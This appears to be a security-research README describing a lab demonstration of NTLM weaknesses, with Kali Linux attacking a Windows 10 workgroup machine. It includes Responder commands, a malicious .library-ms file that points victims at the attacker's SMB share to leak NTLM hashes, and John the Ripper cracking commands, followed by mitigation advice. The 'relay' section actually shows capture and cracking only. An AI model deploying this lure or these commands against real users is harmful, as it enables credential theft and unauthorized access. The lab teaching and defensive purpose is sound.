# NTLM Security Research

## Overview

This repository contains a comprehensive analysis of **NTLM authentication vulnerabilities** with a focus on **NTLM relay attacks** and methods to capture and crack NTLM hashes. The tests were performed in a controlled environment using **Kali Linux** as the attacker machine and **Windows 10** in a **workgroup setup** as the target machine. This project aims to demonstrate how attackers exploit NTLM authentication flaws and how defenders can mitigate these risks.

### Objectives:
- Understand and analyze the NTLM authentication process.
- Demonstrate NTLM relay attacks and their potential impact.
- Capture NTLM hashes and explore methods for cracking them.
- Provide mitigation strategies to enhance security against NTLM-based vulnerabilities.

## Table of Contents

1. [Introduction](#introduction)
2. [Lab Setup](#lab-setup)
3. [NTLM Authentication Overview](#ntlm-authentication-overview)
4. [NTLM Relay Attack](#ntlm-relay-attack)
5. [Hash Capture and Cracking](#hash-capture-and-cracking)
6. [Mitigation Strategies](#mitigation-strategies)
7. [Conclusion](#conclusion)
8. [References](#references)

## Introduction

**NTLM (NT LAN Manager)** is a set of Microsoft security protocols used for authentication in Windows environments. While still widely used, NTLM contains several vulnerabilities that can be exploited by attackers. The goal of this research is to provide a detailed understanding of these vulnerabilities, particularly focusing on **NTLM relay attacks**, **hash capturing**, and **cracking techniques**.

This repository presents the results of practical tests conducted in a **workgroup environment** (rather than a domain-based setup), highlighting real-world security risks.

## Lab Setup

The testing environment consists of two virtual machines:
- **Kali Linux** (attacker machine)
- **Windows 10** (target machine, in a workgroup setup)

### Kali Linux Configuration:
- **IP Address**: 192.168.56.101
- **Tools**: Responder, Metasploit, John the Ripper, Hashcat

### Windows 10 Configuration:
- **IP Address**: 192.168.56.102
- **Workgroup Setup**: No Active Directory
- **NTLM Authentication**: Enabled

Both machines are connected via a **Host-Only** network to simulate an isolated, controlled testing environment.

## NTLM Authentication Overview

NTLM is an authentication protocol that uses a **challenge-response** mechanism to authenticate users. Despite being a legacy protocol, it is still in use today, often in environments where older Windows systems or configurations are required.

### NTLM Authentication Process:
1. **Client sends a request** to the server for access.
2. **Server sends a challenge** back to the client.
3. **Client sends a response** using a hashed value of the user's password.
4. **Server validates** the response and grants access if correct.

### NTLM Vulnerabilities:
- **Weak Hashing**: NTLM hashes can be easily cracked if intercepted.
- **NTLM Relay Attacks**: Attackers can intercept and relay NTLM authentication messages to gain unauthorized access.

### Types of NTLM Authentication:
- **LM Hashes**: Deprecated and very insecure.
- **NTLMv1**: Older version with known vulnerabilities.
- **NTLMv2**: More secure but still vulnerable to relay attacks if not properly configured.

## NTLM Relay Attack

### What is an NTLM Relay Attack?

An NTLM relay attack involves an attacker intercepting and relaying NTLM authentication messages between a client and a server. This allows the attacker to authenticate as the victim on other machines without needing to know their password.

### Steps for Performing an NTLM Relay Attack:

1. **Configure Responder on Kali Linux**:
   Responder listens for NTLM authentication requests on the network and can capture them.
   ```bash
   sudo responder -I eth0
   ```

2. **Create Malicious `.library-ms` File**:
   This file can be used to trick the victim into sending NTLM authentication requests.
   ```xml
   <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
     <name>SharedDocs</name>
     <version>6</version>
     <isLibraryPinned>true</isLibraryPinned>
     <iconReference>imageres.dll,-1003</iconReference>
     <templateInfo>
       <folderType>Documents</folderType>
     </templateInfo>
     <searchConnectorDescriptionList>
       <searchConnectorDescription>
         <simpleLocation>
           <url>\\192.168.56.101\anything</url>
         </simpleLocation>
       </searchConnectorDescription>
     </searchConnectorDescriptionList>
   </libraryDescription>
   ```

3. **Capture NTLM Hashes**:
   When the victim interacts with the malicious file, Responder captures their NTLM hash.

4. **Crack NTLM Hash**:
   Use **John the Ripper** or **Hashcat** to crack the captured hash.
   ```bash
   john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   ```

---

## Hash Capture and Cracking

In this section, the process of capturing NTLM hashes and cracking them using tools like **John the Ripper** and **Hashcat** is demonstrated.

### Steps for Capturing NTLM Hashes:
1. **Run Responder**:
   ```bash
   sudo responder -I eth0
   ```

2. **Crack the Captured Hashes**:
   - Hashes are saved in the `/usr/share/responder/logs` directory.
   - Use **John the Ripper** for cracking:
   ```bash
   john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   ```

---

## Mitigation Strategies

### How to Protect Against NTLM Relay Attacks:
1. **Disable NTLM**: Use **Kerberos** authentication instead of NTLM whenever possible.
   - Configure **Group Policies** to disable NTLM or enforce **NTLMv2**.

2. **Enforce SMB Signing**: Require SMB signing to protect against tampering with SMB traffic.

3. **Use Network Segmentation**: Isolate critical systems to reduce the attack surface.

4. **Deploy Multi-Factor Authentication (MFA)**: Add an additional layer of security to authentication processes.

5. **Update Systems Regularly**: Ensure that Windows systems are patched with the latest security updates to protect against known vulnerabilities.

---

## Conclusion

This repository provides a detailed demonstration of **NTLM relay attacks**, capturing **NTLM hashes**, and cracking them using popular tools. By understanding these vulnerabilities, organizations can take appropriate steps to mitigate the risks associated with NTLM authentication.

## References

- [NTLM Relay Attack Overview]([https://www.rapid7.com/db/vulnerabilities/](https://www.semperis.com/blog/how-to-defend-against-ntlm-relay-attack/))
- [Responder GitHub Repository](https://github.com/SpiderLabs/Responder)
- [John the Ripper Documentation](https://www.openwall.com/john/)
- [Microsoft Security Documentation](https://docs.microsoft.com/en-us/security-updates)
